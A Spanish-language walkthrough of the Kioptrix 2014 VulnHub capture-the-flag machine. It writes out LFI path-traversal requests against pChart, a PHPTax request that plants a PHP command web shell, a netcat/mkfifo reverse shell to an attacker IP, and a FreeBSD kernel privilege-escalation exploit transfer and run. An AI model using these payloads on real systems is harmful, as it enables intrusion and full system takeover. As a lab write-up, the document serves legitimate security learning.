# KIOPTRIX2014
Desarrollo del CTF KIOPTRIX2014. Download the VM: https://www.vulnhub.com/entry/kioptrix-2014-5,62/

Importante: Al añadir la máquina Virtual, crear una nueva VM que se compatible con VM Workstation 10.

## Escaneo de Puertos
```
root@kali:~/KIOPTRIX2014# nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 192.168.1.105
PORT     STATE  SERVICE REASON         VERSION
22/tcp   closed ssh     reset ttl 64
80/tcp   open   http    syn-ack ttl 64 Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    syn-ack ttl 64 Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
``` 

## Enumeración de archivos y carpetas

1. La enumeración con GOBUSTER no nos brinda ninguna carpeta o archivo de utilidad.
2. Revisando el código HTML de la página obtenemos la siguiente ruta: pChart2.1.3/index.php
```
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>
```
## Identificación de LFI (Local File Inclusion)

### 1. PROXY BURP para identificar URL vulnerable:
```
GET /pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../etc/passwd 
```
<img src="https://github.com/El-Palomo/KIOPTRIX2014/blob/main/kioptrix1.jpg" width="80%"></img>

### 2. Buscamos archivos importantes:
El listado aquí: https://github.com/hussein98d/LFI-files/blob/master/list.txt

Encontramos 04 archivos de configuración:
```
pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../usr/local/etc/php.ini
pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../usr/local/etc/apache22/httpd.conf
pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../etc/ftpusers
pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../etc/rc.conf
```

### 3. Analizando el archivo HTTPD.conf
El virtualhost del puerto 8080 solo permite conexiones con un USER-AGENT especial.

```
Listen 80
Listen 8080
DocumentRoot "/usr/local/www/apache22/data"

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
</VirtualHost>
```

## Acceder al puerto 8080

### 1. Con la información obtenida modificar el USER-AGENT 
<img src="https://github.com/El-Palomo/KIOPTRIX2014/blob/main/kioptrix2.jpg" width="80%"></img>

### 2. ¿Qué es PHPTAX y tiene vulnerabilidadeS?

Buscamos vulnerabilidades en EXPLOIT-DB
<img src="https://github.com/El-Palomo/KIOPTRIX2014/blob/main/kioptrix3.jpg" width="80%"></img>

La opción 1 y 3 eran una opción, la opción 02 no porque es METASPLOIT y la idea es utilizarlo lo menos posible.

### 3. Explotando la vulnerabilidad

https://www.exploit-db.com/exploits/25849 (Opción 01)

Creamos el archivo ejemplo.php
```
GET /phptax/index.php?field=ejemplo.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E"; HTTP/1.1
Host: 192.168.1.33:8080
User-Agent: Mozilla/4.0 Mozilla4_browser
```

<img src="https://github.com/El-Palomo/KIOPTRIX2014/blob/main/kioptrix4.jpg" width="80%"></img>

### 4.Obtener conexión reversa

Durante las pruebas se identificó que el sistema cuenta con NETCAT pero no tiene la opción "-e" asi que utilizamos el siguiente comando (hay que encodearlo):

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 5555 >/tmp/f
```

<img src="https://github.com/El-Palomo/KIOPTRIX2014/blob/main/kioptrix5.jpg" width="80%"></img>


## Elevar Privilegios

### 1. Revisar la versión del KERNEL en EXPLOIT-DB 

```
$ uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64

root@kali:~# searchsploit FreeBSD 9.0
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation                 | freebsd/local/28718.c
FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation           | freebsd/local/26368.c
----------------------------------------------------------------------- ---------------------------------
```

### 2. Transferir el exploit a KIOPTRIX

KIOPTRIX no cuenta con WGET (mi primera opción) asi que transferimos el archivo con NETCAT.
```
En KALI
root@kali:~# cp /usr/share/exploitdb/exploits/freebsd/local/28718.c /tmp/
root@kali:~# netcat -lvp 6666 < /tmp/28718.c 

En KIOPTRIX
$ nc -nv 192.168.1.100 6666 > r00t.c
Connection to 192.168.1.100 6666 port [tcp/*] succeeded!
```

### 3. Compilamos y ejecutamos
```
$ cp r00t.c /tmp/
$ gcc -o r00t r00t.c
r00t.c:178:2: warning: no newline at end of file
$ chmod +x r00t
$ ./r00t
[+] SYSRET FUCKUP!!
[+] Start Engine...
[+] Crotz...
[+] Crotz...
[+] Crotz...
[+] Woohoo!!!
$ whoami
root
```
<img src="https://github.com/El-Palomo/KIOPTRIX2014/blob/main/kioptrix6.jpg" width="80%"></img>

